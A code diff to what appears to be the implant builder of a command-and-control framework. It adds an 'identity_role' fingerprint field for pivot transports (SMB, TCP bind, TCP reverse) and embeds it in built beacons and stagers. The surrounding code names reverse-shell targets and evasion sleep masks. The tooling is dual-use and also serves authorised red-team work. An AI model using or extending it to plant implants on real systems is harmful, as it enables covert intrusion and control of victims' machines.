@@ -60,6 +60,23 @@ class BeaconBuildConfig:
     tcp_rev_listen:  str = ''
     tcp_rev_target:  str = ''
     tcp_rev_token:   str = ''
+
+    # Identity disambiguator, mixed into the server's session
+    # fingerprint when non-empty. Empty (the default) produces
+    # the pre-role fingerprint exactly, so no deployed agent's
+    # session is invalidated by the field's existence.
+    #
+    # The builder defaults this to a transport-specific value
+    # for the three pivot child transports:
+    #
+    #     smb      -> 'smb-child'
+    #     tcp      -> 'tcp-bind'
+    #     tcprev   -> 'tcp-rev'
+    #
+    # Every other build defaults to empty. An explicit value
+    # always wins, so an operator can name two agents
+    # 'primary' and 'backup' even when neither is a pivot.
+    identity_role:   str = ''
     work_hours_start: str = '08:00'
     work_hours_end:   str = '19:00'
     tls_profile: str = 'go'
@@ -299,6 +316,41 @@ def generate_pivot_keypair(out_path: str) -> tuple:
         _b64.b64encode(priv_der).decode('ascii'),
         _b64.b64encode(pub_der).decode('ascii'),
     )
+
+
+# ---------------------------------------------------------------------
+# Identity role defaulting
+
+def _default_identity_role(cfg: 'BeaconBuildConfig') -> str:
+    """Return the identity role the build should carry.
+
+    An explicit `identity_role` always wins. Otherwise, the three
+    pivot child transports get a default that disambiguates them
+    from their parent on the same host. Every other build gets an
+    empty role, which reproduces the pre-role fingerprint exactly.
+
+    The role travels in its own field on the wire and is mixed into
+    the server's fingerprint hash. It is deliberately not a
+    hostname suffix: the beacon list should show the machine's real
+    hostname, and the role is a fingerprint input rather than a
+    display name.
+
+    The three defaults match the transport names in
+    `transport_mode`. A future transport that also runs same-host
+    beside a parent should extend this switch and the server's
+    `_fingerprint` together.
+    """
+    explicit = (getattr(cfg, 'identity_role', '') or '').strip()
+    if explicit:
+        return explicit
+    mode = (getattr(cfg, 'transport_mode', '') or '').strip().lower()
+    if mode == 'smb':
+        return 'smb-child'
+    if mode == 'tcp':
+        return 'tcp-bind'
+    if mode == 'tcprev':
+        return 'tcp-rev'
+    return ''
 
 
 # ---------------------------------------------------------------------
@@ -609,6 +661,17 @@ class BeaconBuilder:
                     f"are 'http', 'dns', 'doh', 'icmp', 'smb', "
                     f"'tcp', 'tcprev', 'quic', 'websocket', "
                     f"'wireguard', or a comma-separated list")
+
+        # Identity role. Defaulted to a transport-specific value
+        # for the three pivot child transports; empty for every
+        # other build. Emitted only when non-empty so an agent
+        # built without a role produces the same fingerprint it
+        # always did, and no deployed session is invalidated by
+        # this flag's existence.
+        identity_role = _default_identity_role(cfg)
+        if identity_role:
+            flags.append(
+                f"-X main.IdentityRole={identity_role}")
 
         _VALID_SLEEP_MASKS = ('', 'none', 'rc4', 'aes-ctr',
                               'cronos', 'hwbp')
@@ -1095,6 +1158,12 @@ class BeaconBuilder:
             f"-X main.WorkHoursEndRaw={cfg.work_hours_end}",
             f"-X main.ServerECDHPubkey={cfg.server_ecdh_pubkey_b64}",
         ]
+
+        stager_identity_role = (
+            getattr(cfg, 'identity_role', '') or '').strip()
+        if stager_identity_role:
+            flags.append(
+                f"-X main.IdentityRole={stager_identity_role}")
 
         if profile is not None:
             if profile.get('shaping'):
